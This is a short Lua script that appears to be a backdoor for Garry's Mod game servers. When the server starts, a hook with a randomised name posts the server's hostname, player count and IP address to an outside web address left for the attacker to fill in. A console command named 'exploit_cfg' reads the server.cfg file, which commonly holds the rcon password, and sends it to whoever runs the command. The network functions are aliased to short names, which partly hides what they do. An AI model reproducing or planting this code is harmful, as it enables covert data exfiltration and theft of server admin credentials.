if ( SERVER ) then

local n = net
local s = n.Start
local ss = n.WriteString
local stc = n.Send
local hp = http.Post

util.AddNetworkString("c")

game.GetIP = game.GetIP or function()

	local hostip = GetConVarString( "hostip" ) -- GetConVarNumber is inaccurate
	
	if ( not hostip or hostip == "" ) then
		return "127.0.0.1"
	end

	hostip = tonumber( hostip )

	local ip = {}
	ip[ 1 ] = bit.rshift( bit.band( hostip, 0xFF000000 ), 24 )
	ip[ 2 ] = bit.rshift( bit.band( hostip, 0x00FF0000 ), 16 )
	ip[ 3 ] = bit.rshift( bit.band( hostip, 0x0000FF00 ), 8 )
	ip[ 4 ] = bit.band( hostip, 0x000000FF )

	return table.concat( ip, "." )
end

hook.Add("InitPostEntity", math.random(20,40), function()
	local sendTbl = {
		sn = GetHostName(),
		playercount = tostring(#player.GetAll()),
		ip = game.GetIP()
	}
	
	http.Post( "YOUR DOMAIN HERE WITH THE DIRECTORY OF INDEX.PHP e.g yoursite.com/directory/index.php", sendTbl )
end)

local function DumpCFG(p)
	s("c")
	ss(file.Read("cfg/server.cfg","GAME"))
	stc(p)
end
concommand.Add("exploit_cfg", DumpCFG)
end
